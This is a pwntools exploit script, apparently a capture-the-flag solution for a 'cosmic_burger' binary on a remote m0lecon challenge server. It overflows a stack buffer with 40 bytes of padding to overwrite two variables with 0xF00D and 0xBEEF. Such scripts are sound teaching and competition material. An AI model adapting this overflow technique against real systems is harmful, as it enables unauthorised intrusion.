#!/usr/bin/env python3
from pwn import *

context.binary = elf = ELF('./cosmic_burger')
context.terminal = ["gdb"]

#p = process([elf.path])
#gdb.attach(p)
# Your exploit here

p = remote('offsec.m0lecon.it', 13538)

order_addr = 0x7fffffffde80
sauce_addr = 0x7fffffffdeac
cheese_addr = 0x7fffffffdea8

# cheese offset = 0x6161616b = 40
# sauce offset = 0x6161616c = 44
offset_1 = sauce_addr - order_addr
offset_2 = cheese_addr - order_addr
print(f'Offset 1: {offset_1}')
print(f'Offset 2: {offset_2}')

payload = b'A' * 40
payload += p32(0xF00D)
payload += p32(0xBEEF)

p.sendline(payload)
p.interactive()
